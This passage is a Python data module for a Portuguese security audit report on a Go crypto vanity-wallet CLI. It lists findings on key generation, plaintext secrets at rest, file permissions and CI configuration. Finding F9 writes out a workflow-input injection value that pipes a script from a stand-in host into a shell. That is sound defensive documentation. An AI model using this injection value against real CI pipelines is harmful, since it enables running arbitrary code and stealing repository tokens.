# -*- coding: utf-8 -*-
"""
Base de dados da auditoria de segurança do bloco-vanity-generator.

Este módulo concentra TODO o conteúdo do relatório (achados, pontos fortes,
recomendações e issues do GitHub). Os geradores (`gerar_relatorio.py`) apenas
formatam estes dados em PDF e Markdown, de modo que atualizar a auditoria
significa editar apenas este arquivo.

Severidades válidas: critica, alta, media, baixa, informativa.
"""

PROJETO = "bloco-vanity-generator"
DATA_AUDITORIA = "01 de setembro de 2026"
COMMIT = "4884aff"
BRANCH = "claude/security-audit-five-vulnerabilities-04alh4"

CORES = {
    "critica": "#B91C1C",
    "alta": "#EA580C",
    "media": "#D97706",
    "baixa": "#2563EB",
    "informativa": "#64748B",
    "forte": "#059669",
}

ROTULO_SEVERIDADE = {
    "critica": "CRÍTICA",
    "alta": "ALTA",
    "media": "MÉDIA",
    "baixa": "BAIXA",
    "informativa": "INFORMATIVA",
}

STACK = {
    "Linguagem": "Go 1.25.9 (módulo `bloco-vgen`)",
    "Tipo de aplicação": "CLI local de linha de comando (sem servidor HTTP, sem daemon, sem API)",
    "Framework CLI": "spf13/cobra 1.10.1 + charmbracelet/fang",
    "Interface": "TUI de terminal (bubbletea 1.3.6 / lipgloss 1.1.0) - não há frontend web",
    "Persistência": "Sistema de arquivos local (`./keystores`). Não há banco de dados, ORM ou query builder",
    "Autenticação": "Inexistente. Não há usuários, sessões, tokens ou multi-tenancy",
    "Criptografia": "go-ethereum 1.17.0, btcd/btcec v2.3.5, decred secp256k1 v4.4.0, ed25519, "
    "golang.org/x/crypto 0.55.0 (scrypt/pbkdf2)",
    "Aceleração": "Engine CPU (Go puro) e engine Metal/GPU (CGO, apenas darwin/arm64)",
    "Deploy": "Dockerfile multi-stage (alpine, usuário não-root uid 1001) e 5 workflows do GitHub Actions",
    "Scans já existentes": "gosec, govulncheck, Semgrep, Trivy, Mend/WhiteSource, Dependabot (config vazia)",
}

# Como cada categoria pedida foi mapeada para esta stack.
MAPEAMENTO_CATEGORIAS = [
    {
        "n": 1,
        "titulo": "Banco sem tranca (isolamento de inquilino/dono)",
        "aplicavel": False,
        "mapeamento": "O projeto não possui banco de dados, RLS, ORM, middleware de tenant nem usuários. "
        "O ÚNICO limite de isolamento existente é o do sistema operacional: permissões de "
        "arquivo e de diretório sobre os artefatos gravados em `./keystores` e sobre os "
        "arquivos de log. A auditoria percorreu portanto todas as chamadas de escrita "
        "(`os.WriteFile`, `os.OpenFile`, `os.MkdirAll`, `os.CreateTemp`) e todas as verificações "
        "de permissão. Achados nesta dimensão: F6, F7, F8.",
    },
    {
        "n": 2,
        "titulo": "Permissão definida no navegador (controle no cliente, não no servidor)",
        "aplicavel": False,
        "mapeamento": "Não existe separação frontend/backend, papéis, `isAdmin` ou `canEdit`. O equivalente "
        "estrutural nesta stack é o controle de segurança declarado e validado na camada de "
        "flags da CLI que NÃO é aplicado na camada que de fato executa a operação "
        "(`internal/crypto`). A auditoria cruzou cada flag de segurança "
        "(`--security-level`, `--kdf-params`, `--output`, `keystore.file_mode`) com o ponto de "
        "consumo real. Achados: F5, F8, F10.",
    },
    {
        "n": 3,
        "titulo": "IDOR (acesso a objeto por ID sem verificação de posse)",
        "aplicavel": False,
        "mapeamento": "Não há rotas HTTP, handlers, nem objetos identificados por ID pertencentes a "
        "usuários distintos. O equivalente é a construção de caminhos de arquivo a partir "
        "de dados controlados pelo usuário (path traversal / sobrescrita arbitrária). "
        "Foram percorridos TODOS os pontos que montam caminhos: `saveEthereumKeyStore`, "
        "`saveSolanaKeypair`, `SaveMnemonicFile`, `SavePrivateKeyFile`, `writeFileAtomic`, "
        "`ensureOutputDirectory` e as duas escritas de `--output` do subcomando benchmark. "
        "Nenhum achado: ver Pontos Fortes PF4.",
    },
    {
        "n": 4,
        "titulo": "Chaves expostas (segredos hardcoded)",
        "aplicavel": True,
        "mapeamento": "Aplicada integralmente. Varredura de código-fonte, Dockerfile, .dockerignore, Makefile, "
        "5 workflows do GitHub Actions, dependabot.yml, .whitesource, README e docs/, mais "
        "varredura dos 75 commits do histórico Git (`git log --all -p`) por chaves privadas hex, "
        "blocos PEM, tokens `ghp_`/`AKIA`/`xox`/`sk-` e por arquivos `.pwd`/`.key`/`.mnemonic`/`.env` "
        "jamais commitados. Não há frontend, portanto não há bundle para inspecionar. "
        "Resultado do hardcode: LIMPO (PF6). O achado real desta categoria é a exposição de "
        "segredos em REPOUSO gerada em tempo de execução: F2, F3.",
    },
    {
        "n": 5,
        "titulo": "Inputs sem tratamento (XSS)",
        "aplicavel": False,
        "mapeamento": "Não há HTML, template engine (`html/template`, `text/template`), markdown renderizado, "
        "e-mail, WebView ou qualquer superfície de renderização web - confirmado por varredura. "
        "Não existe `eval`/`new Function`. O equivalente é a injeção de input do usuário na "
        "saída do terminal e nos arquivos de log. Verificado: `--prefix` e `--suffix` passam "
        "por validação hexadecimal estrita antes de qualquer uso (PF5) e o logger seguro usa "
        "allowlist de campos (PF3). Nenhum achado explorável.",
    },
]

ACHADOS = [
    {
        "id": "F1",
        "titulo": "Chaves privadas Ethereum são geradas em cadeia linear (k, k+1, k+2, ...) e não são independentes",
        "severidade": "alta",
        "categoria": "Criptografia / geração de chaves",
        "arquivos": [
            "internal/crypto/chain.go:18",
            "internal/crypto/chain.go:405-412",
            "internal/crypto/chain.go:460-478",
            "internal/worker/pool.go:36",
            "internal/worker/pool.go:160-174",
            "internal/worker/pool.go:372-374",
            "internal/worker/pool.go:413-417",
        ],
        "trecho": (
            "internal/crypto/chain.go:18\n"
            "    const ChainBatchSize = 4096\n\n"
            "internal/crypto/chain.go:409-412  (constroi 4096 pontos por adição sucessiva de G)\n"
            "    batch.points[0].Set(&start)\n"
            "    for i := 1; i < ChainBatchSize; i++ {\n"
            "        secp256k1.AddNonConst(&batch.points[i-1], &chainGeneratorPoint, &batch.points[i])\n"
            "    }\n\n"
            "internal/crypto/chain.go:466-470  (a chave privada devolvida é literalmente k0 + posição)\n"
            "    var kScalar, offsetScalar secp256k1.ModNScalar\n"
            "    kScalar.SetByteSlice(batch.k0[:])\n"
            "    offsetScalar.SetInt(uint32(offset))\n"
            "    kScalar.Add(&offsetScalar) // k0 + pos; stays < N by seed range check\n"
            "    kScalar.PutBytesUnchecked(key[:])\n\n"
            "internal/worker/pool.go:372-374  (a chave da cadeia é a chave entregue ao usuário)\n"
            "    var keyBytes [32]byte\n"
            "    var pub [64]byte\n"
            "    keyBytes, pub, err = chain.NextKey()\n\n"
            "internal/worker/pool.go:413-417\n"
            "    // Found a match: reconstruct the ECDSA private key for the\n"
            "    // result (Ethereum only).\n"
            "    privateKey = new(ecdsa.PrivateKey)\n"
            "    privateKey.Curve = ethcrypto.S256()\n"
            "    privateKey.D = new(big.Int).SetBytes(keyBytes[:])"
        ),
        "porque": (
            "No caminho padrão de geração Ethereum (engine CPU, que é o default em Linux/Windows e "
            "sempre que Metal não está disponível), cada worker sorteia UM único seed aleatório k0 e "
            "deriva as 4096 chaves seguintes como k0+1, k0+2, ... k0+4095. A chave privada entregue ao "
            "usuário é exatamente esse escalar. Além disso `Pool.chains` (pool.go:36) reutiliza a mesma "
            "cadeia entre chamadas sucessivas de `GenerateWalletWithContext`, então ao rodar "
            "`--count N` as N carteiras saem tipicamente do mesmo lote e são mutuamente deriváveis.\n\n"
            "Consequência: as carteiras produzidas em uma mesma execução NÃO são independentes. Quem "
            "obtiver UMA chave privada do lote recupera todas as demais testando k+/-i para i em "
            "1..4095 - um espaco de 8190 candidatos, verificável em milissegundos. Isso quebra o padrão "
            "de uso mais comum da ferramenta (gerar várias carteiras de uma vez e trata-las como "
            "compartimentadas: uma quente, uma fria, uma por cliente).\n\n"
            "Verificado empíricamente durante esta auditoria com um teste ad hoc sobre "
            "`crypto.NewPrivateKeyChain()`: a diferença entre chaves consecutivas foi exatamente 1 em "
            "todas as 9 medições.\n\n"
            'Agravante documental: o comentário em chain.go:323-325 afirma gerar "uniformly random '
            'secp256k1 private keys" e o de chain.go:331-332 alerta que a cadeia "must not be used as '
            'a source of independent random keys" - exatamente o que `pool.go` faz ao entregar essas '
            "chaves como carteiras finais. O README não menciona esse comportamento em nenhum ponto, "
            "inclusive na seção 'Current limitations'."
        ),
        "condicoes": (
            "Afeta apenas rede `ethereum` sem `--with-mnemonic`, na engine CPU. NÃO afeta: a engine "
            "Metal (`internal/engine/metal_darwin_arm64.go:1088-1103` usa `crypto/rand` independente por "
            "chave), `--with-mnemonic`, Bitcoin nem Solana. A exploração exige que o atacante conheca "
            "ao menos UMA chave privada do lote; conhecer apenas o endereço não ajuda."
        ),
    },
    {
        "id": "F2",
        "titulo": "Senha do keystore V3 gravada em texto claro no mesmo diretório do keystore",
        "severidade": "alta",
        "categoria": "Segredo exposto em repouso",
        "arquivos": [
            "internal/crypto/keystore.go:1494-1495",
            "internal/crypto/keystore.go:1523-1525",
            "internal/cli/commands.go:1921",
        ],
        "trecho": (
            "internal/crypto/keystore.go:1494-1495\n"
            "    keystorePath := filepath.Join(ks.config.OutputDirectory,\n"
            '        fmt.Sprintf("UTC--%s--%s.json", utcTimestamp(), formattedAddress))\n'
            "    passwordPath := filepath.Join(ks.config.OutputDirectory,\n"
            '        fmt.Sprintf("%s.pwd", formattedAddress))\n\n'
            "internal/crypto/keystore.go:1523-1525\n"
            "    // Write password file atomically with secure permissions (600)\n"
            '    ks.logger.LogDebug(fmt.Sprintf("Writing password file: %s", passwordPath))\n'
            "    if err := ks.writeFileAtomic(passwordPath, []byte(password), 0600); err != nil {"
        ),
        "porque": (
            "O keystore V3 protege a chave privada com scrypt N=262144 + AES-128-CTR + MAC Keccak256 - "
            "criptografia correta é cara de quebrar. Mas a senha que abre esse keystore é gravada em "
            "texto puro no arquivo irmão `0x<endereco>.pwd`, no mesmo diretório, no mesmo instante. "
            "Todo o custo computacional da KDF é anulado: qualquer cópia do diretório `./keystores` "
            "(backup em nuvem, snapshot, `tar` enviado por suporte, sincronização Dropbox/iCloud, "
            "malware que exfiltra a pasta) leva junto a senha. O par keystore+senha equivale a chave "
            "privada em claro.\n\n"
            'O comentário do próprio código ("with secure permissions (600)") reforca a falsa sensação '
            "de proteção: o modo 0600 protege contra outros usuários locais, não contra o vetor real, que é a cópia do diretório inteiro. Não há opção para suprimir o `.pwd`, nem prompt para o "
            "usuário fornecer a própria senha - `GenerateKeyStore` "
            "(keystore.go:1297-1302) sempre gera a senha automaticamente."
        ),
        "condicoes": (
            "Ativo por padrão para a rede `ethereum` sempre que a geração de keystore está habilitada "
            "(padrão). Desativado apenas com `--no-keystore`, o que também elimina qualquer backup. "
            "Comportamento documentado no README (linhas 148 e 255), o que reduz a surpresa mas não o "
            "risco tecnico."
        ),
    },
    {
        "id": "F3",
        "titulo": "Chave privada Solana gravada sem qualquer criptografia, e o 'keypair' salvo não contém chave",
        "severidade": "alta",
        "categoria": "Segredo exposto em repouso",
        "arquivos": [
            "internal/crypto/keystore.go:1467-1473",
            "internal/crypto/keystore.go:1571-1578",
            "internal/crypto/keystore.go:1674-1683",
        ],
        "trecho": (
            "internal/crypto/keystore.go:1467-1473\n"
            '    case "solana":\n'
            "        // Save Solana keypair JSON\n"
            "        if err := ks.saveSolanaKeypair(address, keystore); err != nil {\n"
            "            return err\n"
            "        }\n"
            "        // Also save private key to .key file for easy access (unencrypted)\n"
            "        return ks.SavePrivateKeyFile(address, privateKeyHex, network)\n\n"
            "internal/crypto/keystore.go:1571-1578  (o .json é um placeholder, não um keypair)\n"
            "    // In production, this should be the actual 64-byte array\n"
            "    solanaKeypair := map[string]interface{}{\n"
            '        "type":    "solana-keypair",\n'
            '        "address": address,\n'
            '        "note":    "Solana keypair - private key is encrypted in KeyStore V3 format",\n'
            "    }\n\n"
            "internal/crypto/keystore.go:1674-1679\n"
            "    keyPath := filepath.Join(ks.config.OutputDirectory,\n"
            '        fmt.Sprintf("%s.key", formattedAddress))\n'
            "    if err := ks.writeFileAtomic(keyPath, []byte(privateKeyHex), 0600); err != nil {"
        ),
        "porque": (
            "Para a rede Solana a única cópia utilizável da chave privada é o arquivo `<endereco>.key`, "
            "que contém os 64 bytes da chave Ed25519 em hexadecimal puro, sem KDF, sem cifra e sem MAC. "
            "O keystore V3 é gerado em memória mas nunca chega ao disco nesse fluxo - `saveSolanaKeypair` "
            "grava apenas um JSON de metadados.\n\n"
            'Pior: o campo `note` do JSON afirma literalmente "private key is encrypted in KeyStore V3 '
            'format", o que é falso e induz o usuário a tratar o diretório como protegido quando a '
            "chave está em claro ao lado. Um operador que confie nessa mensagem pode versionar, "
            "sincronizar ou enviar o diretório acreditando que o material está cifrado.\n\n"
            "São dois defeitos somados: (a) segredo em claro em repouso; (b) mensagem no artefato que "
            "descreve incorretamente a proteção aplicada."
        ),
        "condicoes": (
            "Ocorre com `--network solana` e keystore habilitado (padrão). O README (linhas 150 e 249) "
            "reconhece o `.key` em claro, mas não menciona que o texto dentro do `.json` é enganoso."
        ),
    },
    {
        "id": "F4",
        "titulo": "Backup de Bitcoin salva uma mnemônica que não deriva a chave gerada; a chave nunca é persistida",
        "severidade": "alta",
        "categoria": "Perda irreversível de material criptográfico",
        "arquivos": [
            "internal/crypto/bitcoin.go:31-64",
            "internal/cli/commands.go:1832-1858",
            "internal/crypto/keystore.go:1464-1466",
        ],
        "trecho": (
            "internal/crypto/bitcoin.go:37-63\n"
            "    // Generate 32 random bytes for private key\n"
            "    _, err := rand.Read(privateKey)\n"
            "    ...\n"
            "    // Generate BIP-39 mnemonic for backup\n"
            "    // Note: This mnemonic is for backup purposes only and is not used to derive the key\n"
            "    // The actual private key is randomly generated above\n"
            "    mnemonic, err := generateBIP39Mnemonic()\n\n"
            "internal/cli/commands.go:1833-1848\n"
            '    if strings.ToLower(w.Network) == "bitcoin" {\n'
            '        if w.Mnemonic == "" {\n'
            '            return fmt.Errorf("bitcoin wallet requires mnemonic for backup")\n'
            "        }\n"
            "        ...\n"
            "        // Save only the mnemonic for Bitcoin\n"
            "        if err := keystoreService.SaveMnemonicFile(w.Address, w.Mnemonic, w.Network); err != nil {\n\n"
            "internal/crypto/keystore.go:1464-1466\n"
            '    case "bitcoin":\n'
            "        // Bitcoin only saves mnemonic, no KeyStore V3\n"
            '        return fmt.Errorf("bitcoin keystore saving should use SaveMnemonicFile directly")'
        ),
        "porque": (
            "`BitcoinGenerator.GenerateWallet` sorteia 32 bytes aleatórios como chave privada e, "
            "SEPARADAMENTE, sorteia 128 bits de entropia para uma mnemônica BIP-39 sem qualquer relação matemática com essa chave. O fluxo de persistência de Bitcoin grava exclusivamente a "
            "mnemônica (`<endereco>.mnemonic`) e recusa explicitamente gravar keystore. Resultado: o "
            "único artefato em disco é um backup que NÃO restaura a carteira.\n\n"
            "A chave privada real é impressa apenas no stdout (commands.go:1672 / 1722). Se o usuário "
            "estiver no modo TUI padrão, ou usar `--quiet` com `--count > 1` (que suprime a impressão da "
            "chave, commands.go:1719-1725), ou simplesmente fechar o terminal, a chave é perdida de forma "
            "definitiva - com fundos possivelmente já enviados ao endereço vanity gerado.\n\n"
            "É uma falha de disponibilidade/integridade de material criptográfico com impacto financeiro "
            "direto é irreversível, agravada por um arquivo `.mnemonic` que aparenta ser um backup válido "
            "e passa em qualquer inspeção superficial."
        ),
        "condicoes": (
            "`--network bitcoin` com keystore habilitado (padrão). O README (linhas 149 e 248) sinaliza "
            "que a mnemônica não deriva a chave, mas a CLI não emite nenhum aviso em tempo de execução e "
            'ainda imprime "Mnemonic: Saved" (commands.go:1751-1753), reforçando a impressão de que o '
            "backup e valido."
        ),
    },
    {
        "id": "F5",
        "titulo": "--security-level e --kdf-params são validados pela CLI mas descartados pela camada de cifragem",
        "severidade": "media",
        "categoria": "Controle de segurança declarado e não aplicado",
        "arquivos": [
            "internal/crypto/keystore.go:1119",
            "internal/crypto/keystore.go:1003-1004",
            "internal/cli/commands.go:1868-1877",
            "internal/cli/commands.go:1341-1394",
        ],
        "trecho": (
            "internal/cli/commands.go:1868-1877  (a CLI calcula os parâmetros...)\n"
            "    kdfParams := app.config.KeyStore.KDFParams\n"
            "    if len(kdfParams) == 0 {\n"
            "        securityLevel := app.parseSecurityLevel(app.config.KeyStore.SecurityLevel)\n"
            "        defaultParams, err := analyzer.GetOptimizedParams(\n"
            "            app.config.KeyStore.KDFAlgorithm, securityLevel, 512)\n"
            "        ...\n"
            "        kdfParams = defaultParams\n"
            "    }\n\n"
            "internal/crypto/keystore.go:1119  (...e os entrega no config...)\n"
            "    KDFParams       map[string]interface{} // KDF-specific parameters\n\n"
            "internal/crypto/keystore.go:1003-1004  (...mas a cifragem os ignora e usa os defaults fixos)\n"
            "    // Get default parameters for the specified KDF\n"
            "    defaultParams, err := ks.kdfService.GetDefaultParams(kdfType)"
        ),
        "porque": (
            "`KeyStoreConfig.KDFParams` é populado pela CLI (a partir de `--kdf-params` ou dos parâmetros "
            "otimizados por `--security-level`) e nunca lido por `EncryptPrivateKeyWithKDF`, que sempre "
            "chama `GetDefaultParams(kdfType)` - os defaults fixos do handler (scrypt N=262144, r=8, p=1; "
            "pbkdf2 c=262144). Confirmado por rastreamento de todas as 13 ocorrências de `KDFParams` em "
            "`keystore.go`: nenhuma delas lê o campo do config.\n\n"
            "Duas consequências:\n"
            "  (a) o usuário que executa `--security-level very-high` recebe silenciosamente parâmetros "
            "de nível médio, acreditando ter endurecido o keystore. O mesmo vale para quem passa "
            "`--kdf-params '{\"n\":1048576,...}'`. Nenhum aviso é emitido.\n"
            "  (b) o validador da CLI para scrypt (commands.go:1351-1361) aceita N tão baixo quanto 1024 "
            "com r=1/p=1 (~128 KB de memória, trivial de forçar bruta), enquanto o caminho PBKDF2 "
            "(commands.go:1406-1414) impõe corretamente c >= 100000. Essa assimetria hoje não é "
            "explorada porque os parâmetros são descartados, mas o dia em que a ligação for corrigida "
            "sem antes corrigir o validador, keystores fracos passarão a ser gerados.\n\n"
            "Hoje o comportamento falha de forma SEGURA (os defaults são fortes). O risco é de "
            "desalinhamento entre a política declarada e a aplicada, e de regressão futura."
        ),
        "condicoes": "Sempre ativo. Não depende de configuração.",
    },
    {
        "id": "F6",
        "titulo": "Arquivos de log criados com permissão 0644 (legíveis por qualquer usuário local)",
        "severidade": "media",
        "categoria": "Isolamento no sistema de arquivos",
        "arquivos": [
            "pkg/logging/secure_logger.go:623",
            "pkg/logging/secure_logger.go:758",
        ],
        "trecho": (
            "pkg/logging/secure_logger.go:621-624\n"
            "    func (l *FileSecureLogger) initializeFileWriterWithPath(filePath string) error {\n"
            "        file, err := os.OpenFile(filePath,\n"
            "            os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)\n\n"
            "pkg/logging/secure_logger.go:757-758  (mesma permissão após rotação)\n"
            "    // Create new log file\n"
            "    file, err := os.OpenFile(l.config.OutputFile,\n"
            "        os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)"
        ),
        "porque": (
            "Todos os artefatos sensíveis do projeto são gravados com 0600, com uma única exceção: os "
            "arquivos de log, criados com 0644 tanto na abertura inicial quanto após cada rotação. Em "
            "maquina multiusuário ou em container compartilhado, qualquer conta local lê o log.\n\n"
            "O logger é efetivamente seguro quanto a chaves privadas (allowlist rigorosa em "
            "`isSafeParameter`, secure_logger.go:870-968, e redação por regex em `sanitizeError`, "
            "linhas 990-1018) - por isso a severidade e media e não alta. Mas o log registra o campo "
            "`address` como parâmetro seguro (secure_logger.go:918) e as chamadas de "
            "`LogWalletGenerated`. Isso expoe a terceiros locais quais endereços vanity o usuário "
            "gerou, quando, e com que padrão - metadado suficiente para direcionar um ataque, "
            "é incoerente com o rigor de 0600 aplicado em todo o resto do código."
        ),
        "condicoes": (
            "Requer `--log-file <caminho>` ou `BLOCO_LOG_FILE` definido; por padrão o log vai para "
            "stdout e nenhum arquivo é criado. A permissão efetiva ainda depende do umask do processo "
            "(0644 com umask 022, 0640 com umask 027)."
        ),
    },
    {
        "id": "F7",
        "titulo": "Diretório de keystores criado com 0755 e verificação de permissões só testa escrita",
        "severidade": "baixa",
        "categoria": "Isolamento no sistema de arquivos",
        "arquivos": [
            "internal/crypto/keystore.go:1713",
            "internal/crypto/keystore.go:1745",
            "internal/crypto/keystore.go:1863-1900",
        ],
        "trecho": (
            "internal/crypto/keystore.go:1712-1713\n"
            "    // Directory doesn't exist, create it with all parent directories\n"
            "    if err := os.MkdirAll(cleanPath, 0755); err != nil {\n\n"
            "internal/crypto/keystore.go:1744-1745  (writeFileAtomic recria o diretório também com 0755)\n"
            "    // Ensure the directory exists\n"
            "    if err := os.MkdirAll(dir, 0755); err != nil {\n\n"
            "internal/crypto/keystore.go:1885-1890  (CheckDirectoryPermissions só tenta criar um temp)\n"
            "    // Check if directory is writable by attempting to create a temp file\n"
            '    tmpFile, err := os.CreateTemp(ks.config.OutputDirectory, ".permission-test-*")'
        ),
        "porque": (
            "O diretório que armazena keystores, senhas em claro (F2), chaves Solana em claro (F3) e "
            "mnemônicas é criado com 0755: qualquer usuário local pode entrar e listar seu conteúdo. "
            "Os arquivos em si são 0600, então o conteúdo permanece protegido - por isso a severidade e "
            "baixa - mas a listagem revela todos os endereços gerados pelo usuário (os nomes de arquivo "
            "SÃO os endereços) e a existência de arquivos `.pwd`/`.key`.\n\n"
            "Além disso, a função chamada `CheckDirectoryPermissions` não verifica permissão alguma: ela "
            "apenas confirma que o diretório existe, é um diretório e aceita escrita. Se `--keystore-dir` "
            "apontar para um diretório pré-existente com modo 0777 (ex.: `/tmp/keys`, um volume "
            "compartilhado, um share de rede), a função aprova sem qualquer alerta, apesar do nome "
            "prometer o contrario."
        ),
        "condicoes": (
            "Permissão efetiva depende do umask (0755 com umask 022, 0750 com umask 027). Impacto real "
            "só existe em host multiusuário ou container com volume compartilhado."
        ),
    },
    {
        "id": "F8",
        "titulo": "keystore.file_mode é validado na configuração mas nunca aplicado, e aceita até 0777",
        "severidade": "baixa",
        "categoria": "Controle de segurança declarado e não aplicado",
        "arquivos": [
            "internal/config/config.go:63",
            "internal/config/config.go:115",
            "internal/config/config.go:278-280",
        ],
        "trecho": (
            "internal/config/config.go:63\n"
            '    FileMode      int                    `yaml:"file_mode"`\n\n'
            "internal/config/config.go:115\n"
            "    FileMode:      0600,\n\n"
            "internal/config/config.go:278-280\n"
            "    if c.KeyStore.FileMode < 0 || c.KeyStore.FileMode > 0777 {\n"
            '        return fmt.Errorf("invalid file mode: %o (must be between 0000 and 0777)",\n'
            "            c.KeyStore.FileMode)\n"
            "    }"
        ),
        "porque": (
            "O campo `KeyStore.FileMode` existe, tem default 0600, é validado em `Validate()` e é "
            "serializável via YAML - mas nenhuma linha do projeto o lê. Toda escrita de keystore usa o "
            "literal 0600 diretamente (keystore.go:1516, 1525, 1587, 1643, 1678). Confirmado: as únicas "
            "5 ocorrências de `FileMode` em código não-teste são a declaração, o default, a validação e "
            "dois parâmetros de função sem relação.\n\n"
            "Dois problemas: (a) um operador que edite a configuração para endurecer as permissões não "
            "obtem efeito algum, sem aviso; (b) a validação aceita explicitamente até 0777, ou seja, se o "
            "campo vier a ser ligado, a própria validação autoriza gravar chaves privadas com permissão "
            "de leitura e escrita para todos."
        ),
        "condicoes": "Sempre presente. Sem impacto direto hoje, pois o campo é inerte.",
    },
    {
        "id": "F9",
        "titulo": "GitHub Actions: injeção de script via input de workflow_dispatch e action de terceiro não pinada",
        "severidade": "media",
        "categoria": "Cadeia de build / CI",
        "arquivos": [
            ".github/workflows/release.yaml:40-44",
            ".github/workflows/docker.yaml:85",
            ".github/workflows/release.yaml:16-22",
        ],
        "trecho": (
            ".github/workflows/release.yaml:39-44  (input do usuário interpolado direto no shell)\n"
            "    run: |\n"
            '      if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then\n'
            '        echo "version=${{ github.event.inputs.tag }}" >> $GITHUB_OUTPUT\n'
            "      else\n"
            '        echo "version=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT\n'
            "      fi\n\n"
            ".github/workflows/release.yaml:16-22  (permissões amplas concedidas ao workflow)\n"
            "    permissions:\n"
            "      contents: write\n"
            "      packages: write\n"
            "      id-token: write\n\n"
            ".github/workflows/docker.yaml:84-85  (referência mutável a action de terceiro)\n"
            "    - name: Run Trivy vulnerability scanner\n"
            "      uses: aquasecurity/trivy-action@master"
        ),
        "porque": (
            "(a) Injeção de script: `${{ github.event.inputs.tag }}` é expandido pelo runner ANTES da "
            "execução do shell, diretamente dentro do corpo do `run:`. Um valor como "
            '`v1.0.0"; curl evil.sh | sh; echo "` executa comandos arbitrarios num job que detem '
            "`contents: write`, `packages: write` e `id-token: write` - permitindo publicar releases e "
            "imagens maliciosas ou exfiltrar o `GITHUB_TOKEN`. O valor também é reinjetado nos jobs "
            "seguintes via `needs.create-release.outputs.version` (linhas 135, 168, 199, 232, 288), "
            "propagando a injeção para os passos de build. A mitigação padrão (passar por `env:` e usar "
            '"$VAR") está aplicada corretamente em `version-bump.yml:130-136`, mostrando que o padrão '
            "seguro já é conhecido no projeto - mas não foi replicado aqui.\n\n"
            "(b) `aquasecurity/trivy-action@master` referencia um branch mutável: qualquer commit feito "
            "no repositório dessa action passa a executar automaticamente no pipeline, sem revisão. "
            "Todas as demais actions do projeto estão pinadas por tag (`@v4`, `@v5`, `@v3`), o que torna "
            "essa a única exceção."
        ),
        "condicoes": (
            "A injeção exige permissão para disparar `workflow_dispatch` (colaborador com write). Não e "
            "explorável por um fork externo via pull request. A action não pinada é explorada apenas se "
            "o repositório upstream da action for comprometido."
        ),
    },
    {
        "id": "F10",
        "titulo": "--output e --format são registrados mas ignorados, jogando chaves privadas no stdout",
        "severidade": "baixa",
        "categoria": "Controle de segurança declarado e não aplicado",
        "arquivos": [
            "internal/cli/commands.go:102-103",
            "internal/cli/commands.go:1672-1674",
            "internal/cli/commands.go:1721-1725",
        ],
        "trecho": (
            "internal/cli/commands.go:102-103  (flags declaradas na raiz)\n"
            '    flags.String("output", "", "Output file for results (default: stdout)")\n'
            '    flags.String("format", "text", "Output format (text, json, csv)")\n\n'
            "internal/cli/commands.go:1672-1674  (mas o resultado sempre vai para o stdout)\n"
            '    fmt.Printf("Private Key: %s\\n", result.Wallet.PrivateKey)\n'
            '    if result.Wallet.Mnemonic != "" {\n'
            '        fmt.Printf("Mnemonic: %s\\n", result.Wallet.Mnemonic)\n'
            "    }"
        ),
        "porque": (
            'Nenhuma chamada a `GetString("output")` ou `GetString("format")` existe em '
            "`commands.go` - as duas únicas ocorrências no projeto estão em `benchmark.go:130-131`, para "
            "o subcomando benchmark. No caminho de geração de carteiras as flags são aceitas e "
            "silenciosamente descartadas.\n\n"
            "Impacto de segurança: quem executa `bloco-vgen --prefix abc --output carteiras.json` "
            "acredita ter direcionado o material sensível para um arquivo (que o subcomando benchmark "
            "cria corretamente com 0600) e, em vez disso, tem a chave privada impressa no terminal - "
            "onde ela vai parar no scrollback, em `script`/`tee`, em logs de sessão SSH, em gravações "
            "de terminal e no histórico de multiplexadores como tmux/screen. Nenhum erro ou aviso e "
            "emitido."
        ),
        "condicoes": (
            "Sempre. Documentado no README (linha 245) como limitação conhecida, mas a flag continua "
            "sendo aceita sem aviso na execução."
        ),
    },
    {
        "id": "F11",
        "titulo": "Valor desconhecido em --network cai silenciosamente no gerador Ethereum",
        "severidade": "baixa",
        "categoria": "Validação de entrada",
        "arquivos": [
            "internal/worker/pool.go:94-102",
            "pkg/wallet/types.go:141-177",
        ],
        "trecho": (
            "internal/worker/pool.go:94-102\n"
            "    var generator crypto.Generator\n"
            "    switch strings.ToLower(network) {\n"
            '    case "bitcoin":\n'
            "        generator = crypto.NewBitcoinGenerator(poolManager)\n"
            '    case "solana":\n'
            "        generator = crypto.NewSolanaGenerator(poolManager)\n"
            "    default:\n"
            "        generator = crypto.NewEthereumGenerator(poolManager)\n"
            "    }"
        ),
        "porque": (
            "`GenerationCriteria.Validate()` (pkg/wallet/types.go:141-177) válida comprimento de padrão, "
            "hexadecimalidade de prefix/suffix, a combinação checksum/case-sensitive e MaxAttempts - mas "
            "não valida o campo `Network`. Com `--network etherium` (erro de digitação) ou "
            "`--network polygon`, a fabrica cai no `default` e produz uma chave Ethereum, enquanto o "
            "restante do fluxo continua tratando a rede como o valor digitado.\n\n"
            "O resultado é uma falha tardia e confusa: a carteira é gerada e impressa com a chave privada, "
            "mas `validateAddressForNetwork` (keystore.go:1400-1416) rejeita a rede desconhecida e nenhum "
            "backup é gravado. O usuário recebe uma chave privada real, exibida uma única vez no "
            "terminal, sem persistência - risco de perda de material se ele acreditar que o arquivo foi "
            "salvo. A validação deveria ocorrer no parsing da flag, antes de qualquer geração."
        ),
        "condicoes": "Exige que o usuário informe um valor de --network fora de {ethereum, bitcoin, solana}.",
    },
    {
        "id": "F12",
        "titulo": "dependabot.yml permanece com o placeholder do template e nunca executa",
        "severidade": "baixa",
        "categoria": "Cadeia de build / CI",
        "arquivos": [".github/dependabot.yml:6-11"],
        "trecho": (
            ".github/dependabot.yml:6-11\n"
            "    version: 2\n"
            "    updates:\n"
            '      - package-ecosystem: "" # See documentation for possible values\n'
            '        directory: "/" # Location of package manifests\n'
            "        schedule:\n"
            '          interval: "weekly"'
        ),
        "porque": (
            "`package-ecosystem` está vazio - o comentário do template gerado pelo GitHub nunca foi "
            "substituído por `gomod`. A configuração é inválida e o Dependabot não abre nenhuma "
            "atualização de dependência, apesar de o repositório aparentar te-lo habilitado.\n\n"
            "Consequência prática: as 17 dependências diretas e 60+ indiretas de um projeto que "
            "manipula chaves privadas (go-ethereum, btcd/btcec, solana-go, golang.org/x/crypto) ficam "
            "sem atualização automática de segurança. O último commit do repositório "
            '("fix(deps): patch known Go vulnerabilities") indica que a correção vem sendo feita '
            "manualmente. Não há também `package-ecosystem: github-actions`, deixando as próprias "
